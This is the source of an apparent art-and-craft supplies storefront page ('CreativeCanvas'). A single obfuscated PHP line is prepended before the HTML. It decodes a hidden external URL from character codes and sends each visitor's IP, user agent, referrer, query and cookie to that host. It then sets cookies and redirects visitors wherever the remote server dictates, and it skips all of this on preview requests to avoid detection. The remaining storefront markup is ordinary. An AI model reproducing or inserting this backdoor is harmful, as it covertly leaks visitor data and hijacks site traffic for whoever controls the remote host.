<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "535864";$uid="y92mc0jfd6h0l7tb3yf69omfj";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>



<!DOCTYPE html>
<html lang="hi">

    
    <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/69a9729982ed261c407919e2/1jiuufav3';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-733164571"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-733164571');
</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CreativeCanvas - Art & Craft Supplies Store</title>
    <meta name="description" content="Premium art and craft supplies to inspire your creativity. Paints, brushes, DIY kits, and more.">
    
    <!-- Tailwind CSS for modern styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Chart.js for reviews visualization -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="css/style.css">
    
    <!-- Tailwind config for custom colors -->
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#FF6B6B',
                        secondary: '#4ECDC4',
                        accent: '#FFE66D',
                        purple: '#A8E6CF',
                        pink: '#FFB3BA',
                        orange: '#FFCC5C'
                    },
                    fontFamily: {
                        'poppins': ['Poppins', 'sans-serif'],
                        'inter': ['Inter', 'sans-serif']
                    }
                }
            }
        }
    </script>
</head>
<body class="font-inter bg-white">
    <!-- Header -->
    <header class="bg-white shadow-lg sticky top-0 z-50">
        <div class="container mx-auto px-4">
            <!-- Top bar with contact info -->
            <div class="bg-primary text-white py-2 px-4 text-sm">
                <div class="flex justify-between items-center">
                    <div class="flex items-center space-x-4">
                        <span><i class="fas fa-phone mr-1"></i> +91 12345-67890</span>
                        <span><i class="fas fa-envelope mr-1"></i> hello@creativecanvas.com</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <span>Free shipping on orders above ₹999</span>
                    </div>
                </div>
            </div>
            
            <!-- Main navigation -->
            <nav class="py-4">
                <div class="flex justify-between items-center">
                    <!-- Logo -->
                    <div class="flex items-center">
                        <i class="fas fa-palette text-primary text-3xl mr-3"></i>
                        <h1 class="text-2xl font-poppins font-bold text-gray-800">CreativeCanvas</h1>
                    </div>
                    
                    <!-- Desktop Navigation -->
                    <ul class="hidden md:flex space-x-8">
                        <li><a href="#home" class="nav-link text-gray-700 hover:text-primary font-medium">Home</a></li>
                        <li class="relative group">
                            <a href="#products" class="nav-link text-gray-700 hover:text-primary font-medium">Products <i class="fas fa-chevron-down ml-1"></i></a>
                            <div class="absolute top-full left-0 bg-white shadow-lg rounded-lg py-2 w-48 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-300">
                                <a href="#paints" class="block px-4 py-2 text-gray-700 hover:bg-gray-100 hover:text-primary">Paints & Colors</a>
                                <a href="#brushes" class="block px-4 py-2 text-gray-700 hover:bg-gray-100 hover:text-primary">Brushes & Tools</a>
                                <a href="#crafts" class="block px-4 py-2 text-gray-700 hover:bg-gray-100 hover:text-primary">Craft Supplies</a>
                                <a href="#diy" class="block px-4 py-2 text-gray-700 hover:bg-gray-100 hover:text-primary">DIY Kits</a>
                                <a href="#seasonal" class="block px-4 py-2 text-gray-700 hover:bg-gray-100 hover:text-primary">Seasonal Collections</a>
                            </div>
                        </li>
                        <li><a href="#deals" class="nav-link text-gray-700 hover:text-primary font-medium">Deals</a></li>
                        <li><a href="#about" class="nav-link text-gray-700 hover:text-primary font-medium">About</a></li>
                        <li><a href="#contact" class="nav-link text-gray-700 hover:text-primary font-medium">Contact</a></li>
                    </ul>
                    
                    <!-- Search and Cart -->
                    <div class="flex items-center space-x-4">
                        <div class="relative hidden md:block">
                            <input type="text" id="searchInput" placeholder="Search products..." 
                                   class="pl-10 pr-4 py-2 border border-gray-300 rounded-full focus:ring-2 focus:ring-primary focus:border-transparent w-64">
                            <i class="fas fa-search absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                        </div>
                        <button class="relative">
                            <i class="fas fa-shopping-cart text-xl text-gray-700 hover:text-primary"></i>
                            <span id="cartCount" class="absolute -top-2 -right-2 bg-primary text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">0</span>
                        </button>
                        <button id="mobileMenuBtn" class="md:hidden">
                            <i class="fas fa-bars text-xl text-gray-700"></i>
                        </button>
                    </div>
                </div>
            </nav>
            
            <!-- Mobile Navigation -->
            <div id="mobileMenu" class="md:hidden hidden bg-white border-t">
                <div class="py-4 space-y-2">
                    <a href="#home" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">Home</a>
                    <a href="#products" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">Products</a>
                    <a href="#deals" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">Deals</a>
                    <a href="#about" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">About</a>
                    <a href="#contact" class="block px-4 py-2 text-gray-700 hover:bg-gray-100">Contact</a>
                    <div class="px-4 py-2">
                        <input type="text" placeholder="Search products..." 
                               class="w-full pl-10 pr-4 py-2 border border-gray-300 rounded-full">
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main>
        <!-- Hero Section -->
        <section id="home" class="hero-section relative overflow-hidden bg-gradient-to-br from-purple via-pink to-accent min-h-screen flex items-center">
            <div class="absolute inset-0 bg-black bg-opacity-20"></div>
            <div class="container mx-auto px-4 relative z-10">
                <div class="grid md:grid-cols-2 gap-12 items-center">
                    <!-- Hero Content -->
                    <div class="text-center md:text-left">
                        <h1 class="text-5xl md:text-7xl font-poppins font-bold text-white mb-6 leading-tight">
                            Inspire Your <span class="text-accent">Creativity</span>
                        </h1>
                        <p class="text-xl text-white mb-8 leading-relaxed">
                            Discover premium art supplies, craft materials, and DIY kits that bring your creative vision to life. 
                            Quality tools for artists, crafters, and dreamers.
                        </p>
                        <div class="flex flex-col sm:flex-row gap-4 justify-center md:justify-start">
                            <button onclick="scrollToSection('products')" 
                                    class="bg-white text-primary px-8 py-4 rounded-full font-semibold text-lg hover:bg-gray-100 transform hover:scale-105 transition-all duration-300 shadow-lg">
                                <i class="fas fa-shopping-bag mr-2"></i>Start Shopping
                            </button>
                            <button onclick="scrollToSection('about')" 
                                    class="border-2 border-white text-white px-8 py-4 rounded-full font-semibold text-lg hover:bg-white hover:text-primary transition-all duration-300">
                                Learn More
                            </button>
                        </div>
                    </div>
                    
                    <!-- Hero Images -->
                    <div class="relative">
                        <div class="grid grid-cols-2 gap-4">
                            <div class="space-y-4">
                                <div class="bg-white rounded-lg shadow-xl p-4 transform rotate-3 hover:rotate-0 transition-transform duration-300">
                                    <div class="w-full h-40 bg-gradient-to-br from-red-400 to-pink-500 rounded-lg mb-3 flex items-center justify-center">
                                        <i class="fas fa-paint-brush text-white text-3xl"></i>
                                    </div>
                                    <h3 class="font-semibold text-gray-800">Premium Brushes</h3>
                                </div>
                                <div class="bg-white rounded-lg shadow-xl p-4 transform -rotate-2 hover:rotate-0 transition-transform duration-300">
                                    <div class="w-full h-32 bg-gradient-to-br from-blue-400 to-teal-500 rounded-lg mb-3 flex items-center justify-center">
                                        <i class="fas fa-palette text-white text-2xl"></i>
                                    </div>
                                    <h3 class="font-semibold text-gray-800">Vibrant Paints</h3>
                                </div>
                            </div>
                            <div class="space-y-4 mt-8">
                                <div class="bg-white rounded-lg shadow-xl p-4 transform -rotate-3 hover:rotate-0 transition-transform duration-300">
                                    <div class="w-full h-32 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-lg mb-3 flex items-center justify-center">
                                        <i class="fas fa-cut text-white text-2xl"></i>
                                    </div>
                                    <h3 class="font-semibold text-gray-800">Craft Tools</h3>
                                </div>
                                <div class="bg-white rounded-lg shadow-xl p-4 transform rotate-2 hover:rotate-0 transition-transform duration-300">
                                    <div class="w-full h-40 bg-gradient-to-br from-purple-400 to-indigo-500 rounded-lg mb-3 flex items-center justify-center">
                                        <i class="fas fa-gift text-white text-3xl"></i>
                                    </div>
                                    <h3 class="font-semibold text-gray-800">DIY Kits</h3>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Floating Elements -->
            <div class="absolute top-20 left-10 animate-bounce">
                <i class="fas fa-star text-accent text-2xl opacity-60"></i>
            </div>
            <div class="absolute top-40 right-20 animate-pulse">
                <i class="fas fa-heart text-pink text-xl opacity-40"></i>
            </div>
            <div class="absolute bottom-20 left-20 animate-bounce delay-1000">
                <i class="fas fa-paint-brush text-secondary text-lg opacity-50"></i>
            </div>
        </section>

        <!-- Products Section -->
        <section id="products" class="py-20 bg-gray-50">
            <div class="container mx-auto px-4">
                <div class="text-center mb-16">
                    <h2 class="text-4xl font-poppins font-bold text-gray-800 mb-4">Explore Our Collections</h2>
                    <p class="text-xl text-gray-600 max-w-2xl mx-auto">
                        From professional artist supplies to fun craft projects, we have everything to fuel your creativity
                    </p>
                </div>

                <!-- Category Tabs -->
                <div class="flex flex-wrap justify-center mb-12 space-x-2 space-y-2 md:space-y-0">
                    <button onclick="filterProducts('all')" class="category-btn active px-6 py-3 rounded-full bg-primary text-white font-medium">
                        All Products
                    </button>
                    <button onclick="filterProducts('paints')" class="category-btn px-6 py-3 rounded-full bg-white text-gray-700 border border-gray-300 font-medium hover:bg-primary hover:text-white">
                        Paints & Colors
                    </button>
                    <button onclick="filterProducts('brushes')" class="category-btn px-6 py-3 rounded-full bg-white text-gray-700 border border-gray-300 font-medium hover:bg-primary hover:text-white">
                        Brushes & Tools
                    </button>
                    <button onclick="filterProducts('crafts')" class="category-btn px-6 py-3 rounded-full bg-white text-gray-700 border border-gray-300 font-medium hover:bg-primary hover:text-white">
                        Craft Supplies
                    </button>
                    <button onclick="filterProducts('diy')" class="category-btn px-6 py-3 rounded-full bg-white text-gray-700 border border-gray-300 font-medium hover:bg-primary hover:text-white">
                        DIY Kits
                    </button>
                    <button onclick="filterProducts('seasonal')" class="category-btn px-6 py-3 rounded-full bg-white text-gray-700 border border-gray-300 font-medium hover:bg-primary hover:text-white">
                        Seasonal
                    </button>
                </div>

                <!-- Products Grid -->
                <div id="productsGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
                    <!-- Products will be loaded here via JavaScript -->
                </div>

                <!-- Load More Button -->
                <div class="text-center mt-12">
                    <button onclick="loadMoreProducts()" class="bg-primary text-white px-8 py-3 rounded-full font-semibold hover:bg-red-600 transition-colors">
                        Load More Products
                    </button>
                </div>
            </div>
        </section>

        <!-- Deals Section -->
        <section id="deals" class="py-20 bg-white">
            <div class="container mx-auto px-4">
                <div class="text-center mb-16">
                    <h2 class="text-4xl font-poppins font-bold text-gray-800 mb-4">Special Deals & Offers</h2>
                    <p class="text-xl text-gray-600">Limited time offers on premium art supplies</p>
                </div>

                <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8" id="dealsGrid">
                    <!-- Deals will be loaded here via JavaScript -->
                </div>
            </div>
        </section>

        <!-- About Section -->
        <section id="about" class="py-20 bg-gradient-to-br from-purple via-secondary to-accent">
            <div class="container mx-auto px-4">
                <div class="grid md:grid-cols-2 gap-12 items-center">
                    <div class="text-white">
                        <h2 class="text-4xl font-poppins font-bold mb-6">Our Passion for Art</h2>
                        <p class="text-lg mb-6 leading-relaxed">
                            At CreativeCanvas, we believe that everyone has an artist within them waiting to be unleashed. 
                            Since 2015, we've been dedicated to providing high-quality art and craft supplies that inspire 
                            creativity and bring imagination to life.
                        </p>
                        <p class="text-lg mb-8 leading-relaxed">
                            From professional artists to weekend crafters, from children discovering their creativity to 
                            seniors exploring new hobbies - we support every creative journey with premium materials, 
                            expert guidance, and passionate service.
                        </p>
                        <div class="grid grid-cols-2 gap-6">
                            <div class="text-center">
                                <div class="text-3xl font-bold text-accent mb-2">50,000+</div>
                                <div class="text-sm">Happy Customers</div>
                            </div>
                            <div class="text-center">
                                <div class="text-3xl font-bold text-accent mb-2">10,000+</div>
                                <div class="text-sm">Products</div>
                            </div>
                        </div>
                    </div>
                    <div class="grid grid-cols-2 gap-4">
                        <div class="space-y-4">
                            <div class="bg-white rounded-lg shadow-xl p-6 text-center">
                                <i class="fas fa-award text-primary text-3xl mb-4"></i>
                                <h3 class="font-semibold text-gray-800 mb-2">Premium Quality</h3>
                                <p class="text-sm text-gray-600">Only the finest materials from trusted brands</p>
                            </div>
                            <div class="bg-white rounded-lg shadow-xl p-6 text-center">
                                <i class="fas fa-shipping-fast text-secondary text-3xl mb-4"></i>
                                <h3 class="font-semibold text-gray-800 mb-2">Fast Delivery</h3>
                                <p class="text-sm text-gray-600">Quick and safe delivery to your doorstep</p>
                            </div>
                        </div>
                        <div class="space-y-4 mt-8">
                            <div class="bg-white rounded-lg shadow-xl p-6 text-center">
                                <i class="fas fa-users text-accent text-3xl mb-4"></i>
                                <h3 class="font-semibold text-gray-800 mb-2">Expert Support</h3>
                                <p class="text-sm text-gray-600">Get advice from our art specialists</p>
                            </div>
                            <div class="bg-white rounded-lg shadow-xl p-6 text-center">
                                <i class="fas fa-heart text-pink text-3xl mb-4"></i>
                                <h3 class="font-semibold text-gray-800 mb-2">Made with Love</h3>
                                <p class="text-sm text-gray-600">Curated with passion for your creative journey</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Newsletter Section -->
        <section class="py-16 bg-gray-900 text-white">
            <div class="container mx-auto px-4 text-center">
                <h2 class="text-3xl font-poppins font-bold mb-4">Stay Inspired</h2>
                <p class="text-lg mb-8">Get weekly craft tips, tutorials, and exclusive offers delivered to your inbox</p>
                <form id="newsletterForm" class="flex flex-col sm:flex-row gap-4 max-w-md mx-auto">
                    <input type="email" id="newsletterEmail" placeholder="Enter your email" 
                           class="flex-1 px-4 py-3 rounded-full text-gray-800" required>
                    <button type="submit" class="bg-primary text-white px-6 py-3 rounded-full font-semibold hover:bg-red-600 transition-colors">
                        Subscribe
                    </button>
                </form>
                <p class="text-sm text-gray-400 mt-4">Join 25,000+ creative minds. Unsubscribe anytime.</p>
            </div>
        </section>

        <!-- Contact Section -->
        <section id="contact" class="py-20 bg-gray-50">
            <div class="container mx-auto px-4">
                <div class="text-center mb-16">
                    <h2 class="text-4xl font-poppins font-bold text-gray-800 mb-4">Get In Touch</h2>
                    <p class="text-xl text-gray-600">We'd love to hear from you and help with your creative journey</p>
                </div>

                <div class="grid md:grid-cols-2 gap-12">
                    <!-- Contact Form -->
                    <div class="bg-white rounded-lg shadow-xl p-8">
                        <h3 class="text-2xl font-semibold text-gray-800 mb-6">Send us a Message</h3>
                        <form id="contactForm" class="space-y-6">
                            <div class="grid md:grid-cols-2 gap-4">
                                <input type="text" placeholder="Your Name" 
                                       class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent" required>
                                <input type="email" placeholder="Your Email" 
                                       class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent" required>
                            </div>
                            <input type="text" placeholder="Subject" 
                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent" required>
                            <textarea rows="5" placeholder="Your Message" 
                                      class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent" required></textarea>
                            <button type="submit" class="w-full bg-primary text-white px-6 py-3 rounded-lg font-semibold hover:bg-red-600 transition-colors">
                                Send Message
                            </button>
                        </form>
                    </div>

                    <!-- Contact Info & Map -->
                    <div>
                        <div class="bg-white rounded-lg shadow-xl p-8 mb-6">
                            <h3 class="text-2xl font-semibold text-gray-800 mb-6">Visit Our Store</h3>
                            <div class="space-y-4">
                                <div class="flex items-center">
                                    <i class="fas fa-map-marker-alt text-primary text-xl mr-4"></i>
                                    <div>
                                        <p class="font-semibold">CreativeCanvas Art Store</p>
                                        <p class="text-gray-600">123 Artist Street, Creative District, Mumbai 400001</p>
                                    </div>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-phone text-primary text-xl mr-4"></i>
                                    <div>
                                        <p class="font-semibold">+91 12345-67890</p>
                                        <p class="text-gray-600">Mon-Sat: 10AM-8PM, Sun: 11AM-6PM</p>
                                    </div>
                                </div>
                                <div class="flex items-center">
                                    <i class="fas fa-envelope text-primary text-xl mr-4"></i>
                                    <div>
                                        <p class="font-semibold">hello@creativecanvas.com</p>
                                        <p class="text-gray-600">We reply within 24 hours</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Map -->
                        <div class="bg-white rounded-lg shadow-xl p-4">
                            <div id="map" class="w-full h-64 bg-gray-200 rounded-lg flex items-center justify-center">
                                <div class="text-center text-gray-600">
                                    <i class="fas fa-map text-4xl mb-4"></i>
                                    <p>Interactive Map</p>
                                    <p class="text-sm">123 Artist Street, Mumbai</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="bg-gray-800 text-white py-12">
        <div class="container mx-auto px-4">
            <div class="grid md:grid-cols-4 gap-8">
                <!-- Company Info -->
                <div>
                    <div class="flex items-center mb-4">
                        <i class="fas fa-palette text-primary text-2xl mr-3"></i>
                        <h3 class="text-xl font-poppins font-bold">CreativeCanvas</h3>
                    </div>
                    <p class="text-gray-400 mb-4">
                        Inspiring creativity through premium art and craft supplies since 2015.
                    </p>
                    <div class="flex space-x-4">
                        <a href="#" class="text-gray-400 hover:text-primary"><i class="fab fa-facebook"></i></a>
                        <a href="#" class="text-gray-400 hover:text-primary"><i class="fab fa-instagram"></i></a>
                        <a href="#" class="text-gray-400 hover:text-primary"><i class="fab fa-twitter"></i></a>
                        <a href="#" class="text-gray-400 hover:text-primary"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>

                <!-- Quick Links -->
                <div>
                    <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
                    <ul class="space-y-2">
                        <li><a href="#home" class="text-gray-400 hover:text-primary">Home</a></li>
                        <li><a href="#products" class="text-gray-400 hover:text-primary">Products</a></li>
                        <li><a href="#deals" class="text-gray-400 hover:text-primary">Deals</a></li>
                        <li><a href="#about" class="text-gray-400 hover:text-primary">About Us</a></li>
                        <li><a href="#contact" class="text-gray-400 hover:text-primary">Contact</a></li>
                    </ul>
                </div>

                <!-- Categories -->
                <div>
                    <h4 class="text-lg font-semibold mb-4">Categories</h4>
                    <ul class="space-y-2">
                        <li><a href="#" class="text-gray-400 hover:text-primary">Paints & Colors</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Brushes & Tools</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Craft Supplies</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">DIY Kits</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Seasonal Collections</a></li>
                    </ul>
                </div>

                <!-- Customer Service -->
                <div>
                    <h4 class="text-lg font-semibold mb-4">Customer Service</h4>
                    <ul class="space-y-2">
                        <li><a href="#" class="text-gray-400 hover:text-primary">Shipping Info</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Returns & Exchanges</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Size Guide</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">FAQ</a></li>
                        <li><a href="#" class="text-gray-400 hover:text-primary">Track Your Order</a></li>
                    </ul>
                </div>
            </div>

            <!-- Copyright -->
            <div class="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
                <p>&copy; 2024 CreativeCanvas. All rights reserved. | Privacy Policy | Terms of Service</p>
            </div>
        </div>
    </footer>

    <!-- Cart Modal -->
    <div id="cartModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-lg shadow-xl max-w-md w-full p-6">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-semibold">Shopping Cart</h3>
                    <button onclick="closeCart()" class="text-gray-400 hover:text-gray-600">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
                <div id="cartItems">
                    <!-- Cart items will be displayed here -->
                </div>
                <div class="border-t pt-4 mt-4">
                    <div class="flex justify-between items-center mb-4">
                        <span class="font-semibold">Total: ₹<span id="cartTotal">0</span></span>
                    </div>
                    <button class="w-full bg-primary text-white py-2 rounded-lg hover:bg-red-600 transition-colors">
                        Checkout
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Product Modal -->
    <div id="productModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden">
        <div class="flex items-center justify-center min-h-screen p-4">
            <div class="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-90vh overflow-y-auto">
                <div id="productModalContent">
                    <!-- Product details will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script src="js/main.js"></script>
</body>
</html>
